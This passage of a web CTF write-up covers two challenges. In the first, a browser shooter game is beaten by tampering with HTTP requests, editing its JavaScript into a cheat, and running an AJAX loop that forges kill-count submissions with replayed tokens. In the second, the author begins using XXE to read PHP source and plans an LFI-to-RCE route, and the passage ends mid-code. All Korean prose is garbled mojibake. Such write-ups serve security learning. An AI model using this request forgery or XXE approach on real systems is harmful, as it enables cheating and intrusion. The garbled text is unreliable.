í´ë¦­í•˜ì˜€ì„ ë•Œ &quot;<strong>check=start</strong>&quot; íŒ¨í‚·ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li></ul><p id="0034fa29-f630-41e1-b786-87011eafee71" class="">
</p><ul id="63a672d8-7279-4795-a30a-015fa83b20df" class="bulleted-list"><li>í•˜ì§€ë§Œ &quot;í‚¬ìˆ˜&quot; ì¡°ì‘ ë° &quot;í† í°&quot;ê°’ ì¡°ì‘ì´ ë˜ì–´ ìˆìœ¼ë©´ íƒì§€ê°€ ë˜ì–´ ë¬¸ì œë¥¼ í’€ ìˆ˜ ì—†ëŠ” Protectê°€ ì„¤ì •ë˜ì–´ ìˆë‹¤.</li></ul><p id="8d080e4e-c92e-4526-9b34-2ca1a2cd0619" class="">
</p><figure id="cf1f637c-3110-49b4-bb35-4afa76bfaf5e" class="image"><a href="/assets/2020-09-01/bob/bob919.png"><img style="width:453px" src="/assets/2020-09-01/bob/bob919.png"/></a></figure><p id="f7ed78ae-28ae-4d7e-9cfb-c04247cddc69" class="">
</p><pre id="23e4998c-4fde-495d-b205-f40a23122229" class="code"><code>POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 142
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=20</code></pre><p id="125ac029-d445-4e1b-b38c-2f51c26685dd" class="">[kill ìˆ˜ ì¡°ì‘ëœ íŒ¨í‚· - Request]</p><p id="a4235ea8-664c-4da3-9145-621ba1408efb" class="">
</p><pre id="fd5c61fa-d05d-444a-b09a-caf903f4c85c" class="code"><code>HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 02:22:26 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 146
Connection: close
Content-Type: text/html; charset=UTF-8

alert(&#x27;ë¹„ì •ìƒ í–‰ìœ„ íƒì§€!! Kills ìˆ˜ê°€ ì¡°ì‘ë˜ì—ˆìŠµë‹ˆë‹¤. ë¶€ì •í–‰ìœ„ë¡œ ì ìˆ˜ë¥¼ ì´ˆê¸°í™” ë˜ì—ˆìŠµë‹ˆë‹¤.&#x27;);location.reload(true);</code></pre><p id="819698ce-0135-4814-b2df-94519c1d78f7" class="">[Kill ìˆ˜ ì¡°ì‘ëœ íŒ¨í‚· - Response]</p><ul id="a0135ad3-9e67-4f5e-847d-70453268ad0a" class="bulleted-list"><li>í•´ë‹¹ í‚¬ ìˆ˜ëŠ” ì¼ì •í•˜ê²Œ 15 Killë¥¼ ì¡°ì‘í•˜ì—¬ ì´ˆê³¼í•  ê²½ìš° ìë™ìœ¼ë¡œ ë¶€ì •í–‰ìœ„ë¡œ ê°„ì£¼ë˜ì–´ ê·¸ë™ì•ˆ ìŒ“ì•„ì˜¨ í‚¬ì„ ì´ˆê¸°í™”ëœë‹¤.</li></ul><p id="3a08c13b-4661-40f1-86ba-d2f8274aa612" class="">
</p><ul id="f5a17b9f-94af-4b18-88de-122712835869" class="bulleted-list"><li>ê·¸ëŸ¬ë©´ ë°˜ëŒ€ë¡œ í† í°ê°’ì´ ì¡°ì‘ë˜ì—ˆì„ ë•Œ ì•„ë˜ì™€ ê°™ì´ í† í° ì¡°ì‘ ê²½ê³ ì°½ì´ ì¶œë ¥ëœë‹¤.</li></ul><pre id="cd32bf0c-1a93-4e2e-9c30-3244d749f1e8" class="code"><code>POST /check.php HTTP/1.1
Host: d0ngd0nge.xyz:1818
Content-Length: 169
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://d0ngd0nge.xyz:1818
Referer: http://d0ngd0nge.xyz:1818/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: PHPSESSID=sr6j7mur4mbske04717sbn78k6
Connection: close

kills=15&amp;token=79d7ed5a7bfe66da42d96a7ef433ff4c</code></pre><p id="d6b589d6-5af5-4e9c-9319-8f62d6575ceb" class="">[Token ì¡°ì‘ íŒ¨í‚· - Request]</p><ul id="5a857a61-723f-4cfd-bcb1-7fe5ad0888ef" class="bulleted-list"><li>í† í°ê°’ ì¡°ì‘</li></ul><p id="a96e19c5-6476-4e54-8395-0c45cb72c739" class="">
</p><pre id="dd8e5437-75b6-44de-a425-9520892af6c7" class="code"><code>HTTP/1.1 200 OK
Date: Sun, 30 Aug 2020 02:26:12 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.9
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 161
Connection: close
Content-Type: text/html; charset=UTF-8

alert(&#x27;ë¹„ì •ìƒ í–‰ìœ„ íƒì§€!! í† í°ê°’ì´ ì¼ì¹˜í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë¹„ì •ìƒ í–‰ìœ„ë¡œ ì ìˆ˜ê°€ í•©ì³ì§€ì§€ ì•ŠìŠµë‹ˆë‹¤. ìƒˆë¡œê³ ì¹¨ í•´ì£¼ì‹­ì‹œì˜¤&#x27;);</code></pre><p id="5643665a-36bc-48bc-a334-478fa4815153" class="">[Token ì¡°ì‘ íŒ¨í‚· - Response]</p><p id="747b42e2-5e6f-44f8-a368-eb37bc3dd910" class="">ì¡°ì‘ëœ í† í°ê°’ í–‰ìœ„ëŠ” ìœ„ì™€ ê°™ì´ íƒì§€ë˜ì–´ ë”ì´ìƒ Killìˆ˜ê°€ ìŒ“ì´ì§€ ì•ŠëŠ”ë‹¤.</p><p id="7cd3679d-d403-443b-a528-7c935feb4548" class="">
</p><h3 id="21a4afef-4293-4755-804c-dde17ff61e99" class="">2<strong>. Hint &amp; Debug ì •ë³´ ì°¾ê¸°</strong></h3><ul id="ce59e941-2919-4f67-b836-87f3fedf8ad8" class="bulleted-list"><li>ì´ì œ ë¡œì§ì— ëŒ€í•´ íŒŒì•…í•˜ì˜€ìœ¼ë‹ˆ, ë¬¸ì œ í’€ì´ë¥¼ ìœ„í•œ íŒíŠ¸ ì •ë³´ë¥¼ ì°¾ì•„ë³´ë„ë¡ í•˜ì.</li></ul><p id="b1246ebc-7d7d-48b9-9b81-66532ce080b1" class="">
</p><figure id="d441aa11-95e9-4f84-ac4e-3c91f641d3de" class="image"><a href="/assets/2020-09-01/bob/bob920.png"><img style="width:289px" src="/assets/2020-09-01/bob/bob920.png"/></a></figure><p id="9a6906cd-044d-48d9-99f3-557ad446059f" class="">
</p><ul id="8068a341-4d9b-4843-bd18-d3bc04fbc6e4" class="bulleted-list"><li>Chrome Consoleì„ í™•ì¸í•´ë³´ë©´ ìœ„ì™€ ê°™ì´ ì†Œìˆ˜ì  ê°’ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. (ì¶œë ¥ëœ ê°’ì˜ ê°œìˆ˜ëŠ” ì‚¬ìš©ìë§ˆë‹¤ ë‹¤ë¥¼ ìˆ˜ ìˆìŒ.) í•´ë‹¹ ê°’ì— ëŒ€í•œ ì •ë³´ë¥¼ íŒŒì•…í•˜ê¸° ìœ„í•´ &quot;<strong>bob_game.js</strong>&quot; íŒŒì¼ì˜ 492ë²ˆì§¸ ì¤„ ì½”ë“œë¥¼ í™•ì¸í•´ë³´ë„ë¡ í•˜ì.</li></ul><p id="5cab6650-cb2f-4274-a46f-b205d9e2d778" class="">
</p><pre id="9ebeb365-468a-4861-8dbe-20f0929515d6" class="code"><code>function initGameStart() {
            screen.canvas.width = 1300;
            screen.canvas.height = 900;
            gameSize = {
              width: 1300,
              height: 900
            };
            
            invaderMultiplier = 3;
            initialOffsetInvader = 420;

          invaderAttackRate = 0.98 + &quot;&quot; + Math.floor(Math.random() * 10);
         <mark class="highlight-red"> console.log(invaderAttackRate);</mark>
          invaderSpeed = 30;
          spawnDelayCounter = invaderSpawnDelay;
          
          game = new Game();
        }</code></pre><ul id="64726272-d750-4e33-973a-1914836efd4a" class="bulleted-list"><li>492ë²ˆì§¸ ì½”ë“œëŠ” &quot;<strong>console.log(invaderAttackRate);</strong>&quot; ì´ë©° í•´ë‹¹ ê°’ì€ ë³€ìˆ˜ëª…ì—ì„œ ì•Œ ìˆ˜ ìˆë“¯, ê²Œì„ ê³µê²©ì(ì™¸ê³„ì¸)ì˜ ê³µê²© ì†ë„ì´ë©°, í•´ë‹¹ ê°’ì„ ì¡°ì‘í•˜ì—¬ ì–´ë–¤ ë°˜ì‘ì´ ë³´ì´ëŠ”ì§€ í™•ì¸í•´ ë³´ì.</li></ul><p id="4e8383dd-195b-4c26-a9dc-5f5fe640169b" class="">
</p><figure id="017bfa88-ec5b-4a62-ac14-cc7be9e9f526" class="image"><a href="/assets/2020-09-01/bob/Not_Attack.gif"><img style="width:1386px" src="/assets/2020-09-01/bob/Not_Attack.gif"/></a></figure><p id="b66b1c79-e1c4-45b6-8f3d-61b074b93f8b" class="">
</p><ul id="4d27e2a6-8ff6-4f67-94ae-e96fb56c8721" class="bulleted-list"><li>&quot;<strong>invaderAttackRate = 9999;</strong>&quot; ë°©ì‹ìœ¼ë¡œ ê³µê²©ì(ì™¸ê³„ì¸)ì´ ê³µê²©ì„ í•˜ì§€ ì•ŠëŠ” í–‰ìœ„ë¡œ ë¡œì§ì„ êµ¬í˜„í•  ìˆ˜ ìˆìœ¼ë©° ì•„ë˜ì™€ ê°™ì´ ë°˜ëŒ€ë¡œ ê°’ì„ ë‚®ì¶˜ë‹¤ë©´ ê³µê²©ìëŠ” ë” ë¹ ë¥´ê³  ë§ì´ ê³µê²©ì„ í•˜ê²Œ ëœë‹¤.</li></ul><p id="aee65f04-9bb6-4ff8-8e73-e870d45e50e2" class="">
</p><figure id="4dede993-ea1e-40ff-8122-1aee239eee4b" class="image"><a href="/assets/2020-09-01/bob/Attack.gif"><img style="width:1386px" src="/assets/2020-09-01/bob/Attack.gif"/></a></figure><ul id="3a9c46cd-f93a-4821-8f68-42ef8209cb57" class="bulleted-list"><li>&quot;<strong>i</strong><strong>nvaderAttackRate = 0.001;&quot;</strong><strong> ì´ê±´ ë‹µì´ ì—†ë‹¤....</strong></li></ul><p id="341571b8-804c-489b-92cf-bd9d2eb9b160" class="">
</p><p id="57ff79c7-113e-4ee0-8529-e0ed2511cf5a" class="">ìœ„ì™€ ê°™ì´ íŒíŠ¸ë¥¼ í†µí•˜ì—¬ Javasciprt Debugë¥¼ í†µí•˜ì—¬ ë¡œì§ì„ ë³€ê²½í•  ìˆ˜ ìˆëŠ” ê±¸ í™•ì¸í•  ìˆ˜ ìˆë‹¤. í•˜ì§€ë§Œ ê³µê²© ì†ë„ë¡œ ë³€ê²½í•˜ëŠ” ê²ƒ ë³´ë‹¨ &quot;<strong>ìŠ¤í”¼ë“œ</strong>&quot; + &quot;<strong>ë¬´ì </strong>&quot; + &quot;<strong>ê³µê²©ìˆ˜ ë¬´í•œ</strong>&quot;ë¥¼ ê±¸ì–´ ë¬¸ì œ í’€ê±°ë‚˜ ìë°”ìŠ¤í¬ë¦½íŠ¸ ë¡œì§ì„ í†µí•˜ì—¬ ê²Œì„ì„ ì§„í–‰í•˜ì§€ ì•Šê³  í’€ì´ë¥¼ ì§„í–‰í•  ìˆ˜ ìˆë‹¤.</p><p id="5138bc33-49f7-431a-901b-9764964b9773" class="">
</p><p id="6a152b2e-a6b6-4f16-88c6-fc16995e8fe1" class="">
</p><h3 id="818f3b87-dad9-4fd1-9946-887aa33f2afc" class="">3<strong>. ìŠ¤í”¼ë“œ + ë¬´ì  + ê³µê²© ì†ë„ í•µ ë§Œë“¤ê¸°</strong></h3><ul id="d97df995-ecf4-405f-aec4-046a11a62551" class="bulleted-list"><li>ì´ì œ ë¡œì§ì— ëŒ€í•´ íŒŒì•…í•˜ì˜€ìœ¼ë‹ˆ, ë¬¸ì œ í’€ì´ë¥¼ ìœ„í•œ íŒíŠ¸ ì •ë³´ë¥¼ ì°¾ì•„ë³´ë„ë¡ í•˜ì.</li></ul><p id="d6cb1219-7317-4fe9-a149-96e0797c6793" class="">
</p><pre id="14012ded-9971-4a6d-bc42-97c97eff7fa3" class="code"><code>var Player = function() {
          this.active = true;
          this.size = {
            width: 0.1,  //232ë²ˆì§¸ 16 -&gt; 0.1 ìœ¼ë¡œ ìˆ˜ì • (ê²Œì„ í”Œë ˆì´ì–´ ì•ˆë³´ì´ê²Œ ì„¤ì •)
            height: 0.1  //233ë²ˆì§¸ 8  -&gt; 0.1 ìœ¼ë¡œ ìˆ˜ì • (ê²Œì„ í”Œë ˆì´ì–´ ì•ˆë³´ì´ê²Œ ì„¤ì •)
          };

// 259ë²ˆì§¸ ë¼ì¸
if (this.keyboarder.isDown(this.keyboarder.KEYS.LEFT) &amp;&amp; this.coordinates.x &gt; 0) this.coordinates.x -= 30; // 2 -&gt; 30ìœ¼ë¡œ ìˆ˜ì • (ìŠ¤í”¼ë“œ í•µ)

// 260ë²ˆì§¸ ë¼ì¸
else if (this.keyboarder.isDown(this.keyboarder.KEYS.RIGHT) &amp;&amp; this.coordinates.x &lt; gameSize.width - this.size.width) this.coordinates.x += 30; // 2 -&gt; 30ìœ¼ë¡œ ìˆ˜ì • (ìŠ¤í”¼ë“œ í•µ)


if (this.keyboarder.isDown(this.keyboarder.KEYS.Space)) {
            // 263ë²ˆì§¸  this.shooterHeat += 1; ì£¼ì„ ì²˜ë¦¬ (í”Œë ˆì´ì–´ ê³µê²© ì†ë„ ë¬´ì œí•œ)

destroy: function() {
            //291ë²ˆì§¸ this.active = false;  ì£¼ì„ ì²˜ë¦¬ (í”Œë ˆì´ì–´ ë¬´ì )
            //292ë²ˆì§¸ game.lost = true;     ì£¼ì„ ì²˜ë¦¬ (í”Œë ˆì´ì–´ ë¬´ì  - ê²Œì„ ì¢…ë£Œ ì•ˆë˜ê²Œ)
          }


var Projectile = function(coordinates, velocity) {
          this.active = true;
          this.coordinates = coordinates;
          this.size = {
            width: 300, //303ë²ˆì§¸ ì¤„  3 -&gt; 300ìœ¼ë¡œ ë³€ê²½ ìˆ˜ì • (í”Œë ˆì´ì–´ ê³µê²© í¬ê¸° ë³€ê²½)
            height: 3
          };
          this.velocity = velocity;
        };

//491ë²ˆì§¸ invaderAttackRate = 0.98 + &quot;&quot; + Math.floor(Math.random() * 10); ì£¼ì„ ì²˜ë¦¬ (ê³µê²©ì ì™¸ê³„ì¸ì´ ê³µê²© ëª»í•˜ë„ë¡ ìˆ˜ì •)
</code></pre><ul id="975e7c52-a448-4d3c-93e3-d7a45d001a4c" class="bulleted-list"><li>ìœ„ì™€ ê°™ì´ Javascriptë¥¼ ë³€ê²½í•˜ì—¬ í”Œë ˆì´ë¥¼ í•  ê²½ìš° ì•„ë˜ì™€ ê°™ì´ ì‹¤í–‰ëœë‹¤.</li></ul><p id="64c1cc95-2acf-483a-8a80-e52326b0e571" class="">
</p><figure id="86250cd1-430c-4f87-8c4a-ddd4224b34d6"><div class="source"><a></a></div></figure><ul id="e199adf8-cd99-45f2-a1ba-86c90b9b9159" class="bulleted-list"><li>ê²Œì„í•µ ì™„ì„±í•˜ì—¬ í”Œë˜ê·¸ íšë“!</li></ul><ul id="5d3ad86b-c860-49e0-8872-b89f19ee8d4b" class="bulleted-list"><li>ë¬¼ë¡  ìœ„ ì™€ ê°™ì´ Javascript ê²Œì„ í•µì„ ë§Œë“¤ì–´ í”Œë ˆì´í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆì§€ë§Œ, ê²Œì„ ë¡œì§ì„ íŒŒì•…í•˜ì—¬ Javascriptë¥¼ ì½”ë”©í•  ìˆ˜ ìˆë‹¤ë©´ í”Œë ˆì´ ëŒ€ì‹  ë°˜ë³µë¬¸ìœ¼ë¡œ ì•„ë˜ì™€ ê°™ì´ í”Œë˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.</li></ul><p id="cff4eb3b-1dd8-48cf-8e5c-cebaa1671b97" class="">
</p><p id="65b1ceba-439e-4468-bbfd-0f55f2f52516" class="">
</p><h3 id="e02f1131-7194-46d8-918b-3448b32ef06c" class="">4<strong>. Javascript Codingë¥¼ í†µí•˜ì—¬ í”Œë˜ê·¸ íšë“í•˜ê¸°</strong></h3><ul id="44e3c732-28b5-4603-a9cc-c0d1cbebbffe" class="bulleted-list"><li>ì´ë²ˆì—ëŠ” ê²Œì„ í•µìœ¼ë¡œ ë¬¸ì œí’€ì´ ëŒ€ì‹  Javascript ì½”ë”©ì„ í†µí•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“ í•˜ì.</li></ul><pre id="65bffca7-872a-4141-a2cc-6a58e5050cfa" class="code"><code>$.ajaxSetup({async: false});  

var url = &quot;check.php&quot;;
var data = {kills: 15, token: &quot;start&quot;};
token = 1;

$.post(url, data, function(response) {
    token = response;
    
});


for(var i = 0;  i &lt;= 35;  i++) {
    var data = {kills: 15, token: token};

    
    $.post(url, data, function(response) {
        token = response;
    });
};

var data = {check: &quot;clear&quot;};
$.post(url, data, function(response) {
    eval(response);
});</code></pre><ul id="36150e58-8cdc-4d1e-b23f-07f0614f8066" class="bulleted-list"><li>Game ë¡œì§ì„ íŒŒì•…í–ˆë‹¤ë©´ ìœ„ì™€ ê°™ì´ Javascript Codeì˜ Ajaxë¥¼ í†µí•˜ì—¬ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìˆë‹¤.
ë¡œì§ì˜ ì›ë¦¬ëŠ” Killsìˆ˜ê°€ 15ë¥¼ ì´ˆê³¼í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, ë¨¼ì € Tokenê°’ì— &quot;<strong>start</strong>&quot;ë¥¼ ë³´ë‚´ì–´ ë‘ ë²ˆì§¸ ì´í›„ë¶€í„° ì‘ë‹µë˜ì–´ ì˜¨ í† í°ì„ ê°€ì§€ê³  ë‹¤ì‹œ 35ë²ˆ ë°˜ë³µì„ í†µí•˜ì—¬ í† í°ì„ ì „ì†¡í•˜ê³ , ë§ˆì§€ë§‰ìœ¼ë¡œ ê³µê²©ì(ì™¸ê³„ì¸)ë¥¼ ì „ë¶€ ë¬¼ë¦¬ì³¤ë‹¤ëŠ” &quot;<strong>check=clear</strong>&quot; ê°’ì„ ì „ì†¡í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•˜ëŠ” ë¡œì§ì´ë‹¤.</li></ul><p id="c59b32eb-b8f4-4bb3-a9f1-c27c0391bcf7" class="">
</p><figure id="24999b12-d09b-4ac3-a104-fe5400951d02" class="image"><a href="/assets/2020-09-01/bob/clears.gif"><img style="width:1520px" src="/assets/2020-09-01/bob/clears.gif"/></a></figure><p id="a9987a55-8ef2-4d49-96c8-6158c600e8b3" class="">
</p><ul id="d9351912-9bf1-49d9-86ad-5c7e12bfa22e" class="to-do-list"><li><div class="checkbox checkbox-on"></div> <span class="to-do-children-checked">Flag is bob{b0b_!s_fun_g@me_r3tr0}</span></li></ul><p id="bb368f1e-d29e-4366-af3f-0bb81263f56c" class="">
</p><ul id="f6e94f56-b320-4f4d-ada2-a666bad315b4" class="bulleted-list"><li>ëŒ€íšŒ ëë‚˜ê³  Access.logë¥¼ í™•ì¸í•´ë³¸ ê²°ê³¼... &quot;<strong>105961</strong>&quot; Lineì´ ìŒ“ì˜€ë„¤ìš”. 3ì¼ ë§Œì— 10ë§Œ ì¤„ì´ ìŒ“ì¸ ê±¸ ë³´ë‹ˆ ì˜¤ê¸°ë¡œ ê²Œì„ í”Œë ˆì´ì–´ í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•œ ë¶„ë„ ê³„ì‹¤ ê±°ë¼ ì˜ˆìƒë©ë‹ˆë‹¤... (ì¡´ê²½ìŠ¤ëŸ½ìŠµë‹ˆë‹¤...)</li></ul><p id="bff0159b-3a85-4b72-bad5-584fca07b41d" class="">
</p><h2 id="80a3edb1-a805-409f-abed-16c4f235d5ae" class="">babyweb</h2><hr id="b1d26bbe-08eb-4296-955c-cb6a2b65a306"/><figure id="cab02421-f8e3-466f-8470-25fbc6401355" class="image"><a href="/assets/2020-09-01/bob/bob921.png"><img style="width:710px" src="/assets/2020-09-01/bob/bob921.png"/></a></figure><p id="31531414-936e-4193-9088-b5b05e62909f" class="">
</p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="a6b9586d-8722-4939-ac6b-b5fa1d06fd00"><div style="font-size:1.5em"><span class="icon">ğŸ’¡</span></div><div style="width:100%">/readFlag | RCE</div></figure><p id="097de8b7-3466-40e2-9685-4e514745e639" class="">
</p><p id="f5b79677-4734-4b00-a980-c51817e651cd" class="">
</p><p id="6d4461de-1d27-48e1-91bf-9f7bdef479a5" class="">ë¬¸ì œ ì„¤ëª…ì— /readFlag ë¼ê³  ë˜ì–´ ìˆìœ¼ë¯€ë¡œ RCEë¥¼ í•´ì•¼í•˜ëŠ” ë¬¸ì œì´ë‹¤.</p><p id="296b2ef9-5f40-413c-b51e-30da50b7bd41" class="">ë¬¸ì œ í˜ì´ì§€ì— ì ‘ì†í•˜ë©´ XML ì‚¬ìš©í•˜ëŠ” í˜ì´ì§€ê°€ ë‚˜ì˜¨ë‹¤.</p><p id="83c00fa4-89a0-4f8f-9f41-0a1243eeef23" class="">
</p><figure id="ace4a06c-2403-4d2f-8958-479d93bea07a" class="image"><a href="/assets/2020-09-01/bob/bob922.png"><img style="width:1056px" src="/assets/2020-09-01/bob/bob922.png"/></a></figure><p id="1429d01f-54d0-4c07-b7f3-75e2445459b8" class="">
</p><p id="e3200ab6-067a-47fc-90ef-bbb55df8622f" class="">XXE ê³µê²©ì„ í†µí•´ ì†ŒìŠ¤ í˜ì´ì§€ë¥¼ í•˜ë‚˜í•˜ë‚˜ì”© ë³¸ë‹¤.</p><p id="27be1a0f-e596-4aa2-8026-b24342cb9bd3" class="">ë¨¼ì € &quot;join.php&quot;ë¥¼ ë³´ë©´ htmlentitiesë¥¼ í†µí•´ ë¬´ì–¸ê°€ë¥¼ ë§‰ìœ¼ë ¤í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.</p><pre id="cd3dbb48-3bd1-431c-b128-6766cdd30937" class="code"><code>&lt;?php
	$id = mysqli_real_escape_string($dbc, htmlentities($_POST[&#x27;id&#x27;], ENT_QUOTES, &quot;UTF-8&quot;));
	$pw = hash(&#x27;sha256&#x27;, $_POST[&#x27;pw&#x27;]);
	$nick = mysqli_real_escape_string($dbc, htmlentities($_POST[&#x27;nick&#x27;], ENT_QUOTES, &quot;UTF-8&quot;));

	$query = &quot;INSERT INTO users VALUES (NULL,&#x27;{$id}&#x27;, &#x27;{$pw}&#x27;, &#x27;{$nick}&#x27;, &#x27;&#x27;);&quot;;

	$result = mysqli_query($dbc, $query);

	if($result)
		echo &#x27;&lt;script&gt;location.href=&quot;./&quot;;&lt;/script&gt;&#x27;;
	else
		echo &#x27;&lt;script&gt;alert(&quot;Error&quot;); history.go(-1);&lt;/script&gt;&#x27;;
</code></pre><p id="eb32d74a-740a-46c0-91ff-9b8c2dfda527" class="">
</p><p id="490812e1-078d-4fc8-b1bd-bca685fdc066" class="">ê·¸ë¦¬ê³  login.phpë¥¼ ë³´ë©´ $_SESSION ë³€ìˆ˜ì— ë¡œê·¸ì¸í•œ ì•„ì´ë””ì™€ ë‹‰ë„¤ì„ì„ ë„£ëŠ”ë‹¤.</p><pre id="35a988d8-8f50-4aca-8431-bb6b7af5486b" class="code"><code>&lt;?php
	$id = mysqli_real_escape_string($dbc, $_POST[&#x27;id&#x27;]);
	$pw = hash(&#x27;sha256&#x27;, $_POST[&#x27;pw&#x27;]);

	$query = &quot;SELECT * FROM users WHERE userid=&#x27;{$id}&#x27; AND password=&#x27;{$pw}&#x27;&quot;;

	$result = mysqli_query($dbc, $query);
	$row = mysqli_fetch_array($result);

	if($id===$row[&#x27;userid&#x27;] &amp;&amp; $pw===$row[&#x27;password&#x27;]){

		$_SESSION[&#x27;nickname&#x27;] = $row[&#x27;nickname&#x27;];
		$_SESSION[&#x27;userid&#x27;] = $row[&#x27;userid&#x27;];
		echo &#x27;&lt;script&gt;location.href=&quot;./&quot;;&lt;/script&gt;&#x27;;
	}else
		echo &#x27;&lt;script&gt;alert(&quot;Error&quot;); history.go(-1);&lt;/script&gt;&#x27;;
</code></pre><p id="68948b06-0d5a-42c0-9384-2e73cde7fbc4" class="">
</p><p id="3f11a340-3522-437d-890d-32fec7759a32" class="">RCEë¥¼ ìœ„í•´ì„œëŠ” LFI ì·¨ì•½ì ì´ í•„ìš”í•˜ë‹¤. LFIë¥¼ í•˜ê¸° ìœ„í•´ì„  íŒŒì¼ ì—…ë¡œë“œ ê¸°ëŠ¥ì„ ì´ìš©í•˜ê±°ë‚˜ íŒŒì¼ì— ì›í•˜ëŠ” ê²ƒì„ ì“¸ ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì´ ìˆìœ¼ë©´ ëœë‹¤.</p><p id="6d9783a3-65ab-41f8-9893-bdd54003dc43" class="">
</p><p id="9faef9d5-7f4b-4c64-9adf-706b1b21b110" class="">í•˜ì§€ë§Œ &quot;join.php&quot;ì—ì„œ htmlentitiesë¥¼ ì´ìš©í•´ ì„¸ì…˜ íŒŒì¼ì— php íƒœê·¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ì—†ë„ë¡ ì œí•œí•˜ì˜€ë‹¤.</p><p id="e1a4ffff-c090-49a3-b20f-8841187d63dd" class="">
</p><p id="0ff1fd2e-42bd-45d5-942e-a385feea3cdc" class="">ê·¸ ë‹¤ìŒ &quot;getxmldata.php&quot;ë¥¼ ë³´ë©´ mysqli_real_escape_stringë¥¼ í†µí•´ì„œ SQLIë¥¼ ë§‰ì€ ê²ƒ ì²˜ëŸ¼ ë³´ì´ì§€ë§Œ ì‹¤ì œë¡œëŠ” ë§‰íˆì§€ ì•Šì•˜ë‹¤.</p><pre id="5e6ff35e-40d9-43d4-ae94-863d3ddaa4b7" class="code"><code>&lt;?php

function xss_filter($data) 
{ 
    if(empty($data)) 
        return $data; 
         
    if(is_array($data)) 
    { 
        foreach($data as $key =&gt; $value) 
        { 
            $data[$key] = xss_filter($value); 
        } 
         
        return $data; 
    } 
     
    $data = str_replace(array(&#x27;&amp;amp;&#x27;,&#x27;&amp;lt;&#x27;,&#x27;&amp;gt;&#x27;), array(&#x27;&amp;amp;amp;&#x27;,&#x27;&amp;amp;lt;&#x27;,&#x27;&amp;amp;gt;&#x27;), $data); 
    $data = preg_replace(&#x27;/(&amp;#*\\w+)[\\x00-\\x20]+;/&#x27;, &#x27;$1;&#x27;, $data); 
    $data = preg_replace(&#x27;/(&amp;#x*[0-9A-F]+);*/i&#x27;, &#x27;$1;&#x27;, $data); 

    if (function_exists(&quot;html_entity_decode&quot;))
    {
        $data = html_entity_decode($data); 
    }
    else
    {
        $trans_tbl = get_html_translation_table(HTML_ENTITIES);
        $trans_tbl = array_flip($trans_tbl);
        $data = strtr($data, $trans_tbl);
    }

    $data = preg_replace(&#x27;#(&lt;[^&gt;]+?[\\x00-\\x20&quot;\\&#x27;])(?:on|xmlns)[^&gt;]*+&gt;#i&#x27;, &#x27;$1&gt;&#x27;, $data); 
    $data = preg_replace(&#x27;#([a-z]*)[\\x00-\\x20]*=[\\x00-\\x20]*([`\\&#x27;&quot;]*)[\\x00-\\x20]*j[\\x00-\\x20]*a[\\x00-\\x20]*v[\\x00-\\x20]*a[\\x00-\\x20]*s[\\x00-\\x20]*c[\\x00-\\x20]*r[\\x00-\\x20]*i[\\x00-\\x20]*p[\\x00-\\x20]*t[\\x00-\\x20]*:#i&#x27;, &#x27;$1=$2nojavascript...&#x27;, $data); 
    $data = preg_replace(&#x27;#([a-z]*)[\\x00-\\x20]*=([\\&#x27;&quot;]*)[\\x00-\\x20]*v[\\x00-\\x20]*b[\\x00-\\x20]*s[\\x00-\\x20]*c[\\x00-\\x20]*r[\\x00-\\x20]*i[\\x00-\\x20]*p[\\x00-\\x20]*t[\\x00-\\x20]*:#i&#x27;, &#x27;$1=$2novbscript...&#x27;, $data); 
    $data = preg_replace(&#x27;#([a-z]*)[\\x00-\\x20]*=([\\&#x27;&quot;]*)[\\x00-\\x20]*-moz-binding[\\x00-\\x20]*:#&#x27;, &#x27;$1=$2nomozbinding...&#x27;, $data); 
    $data = preg_replace(&#x27;#(&lt;[^&gt;]+?)style[\\x00-\\x20]*=[\\x00-\\x20]*[`\\&#x27;&quot;]*.*?expression[\\x00-\\x20]*\\([^&gt;]*+&gt;#i&#x27;, &#x27;$1&gt;&#x27;, $data); 
    $data = preg_replace(&#x27;#(&lt;[^&gt;]+?)style[\\x00-\\x20]*=[\\x00-\\x20]*[`\\&#x27;&quot;]*.*?behaviour[\\x00-\\x20]*\\([^&gt;]*+&gt;#i&#x27;, &#x27;$1&gt;&#x27;, $data); 
